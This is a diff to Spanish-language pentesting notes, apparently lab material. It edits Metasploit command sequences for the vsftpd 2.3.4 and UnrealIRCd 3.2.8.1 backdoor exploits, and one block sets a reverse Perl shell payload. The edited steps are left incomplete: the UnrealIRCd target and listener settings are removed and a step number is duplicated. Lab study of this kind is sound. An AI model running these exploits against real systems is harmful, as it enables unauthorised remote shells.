@@ -266,12 +266,15 @@ sessions -i <ID_SESION>
 | **Módulo Metasploit** | `exploit/unix/ftp/vsftpd_234_backdoor` [^10] |
 
 ```bash
+# 1
 msfconsole
+# 2
+# 3
 use exploit/unix/ftp/vsftpd_234_backdoor
+# 3 
 set RHOSTS <IP_VICTIMA>
-set RPORT 21
-run
-# Payload: cmd/unix/interact (por defecto, interactúa directamente con la shell)
+# 4
+exploit
 ```
 ![](attachments/{AA746A9D-E5DD-4EF4-88BC-51EB0C86DB5C}.png)
 ![](attachments/{046C2359-FB56-4FF3-8D62-C303BC2989F2}%201.png)
@@ -286,13 +289,15 @@ run
 | **Módulo Metasploit** | `exploit/unix/irc/unreal_ircd_3281_backdoor` [^12] |
 
 ```bash
+# 1
 msfconsole
+# 2
+search ircd
+# 3
 use exploit/unix/irc/unreal_ircd_3281_backdoor
-set RHOSTS <IP_VICTIMA>
-set RPORT 6667
+# 4
 set payload cmd/unix/reverse_perl
-set LHOST <IP_ATACANTE>
-set LPORT 4444
+# 5
 exploit
 ```
 
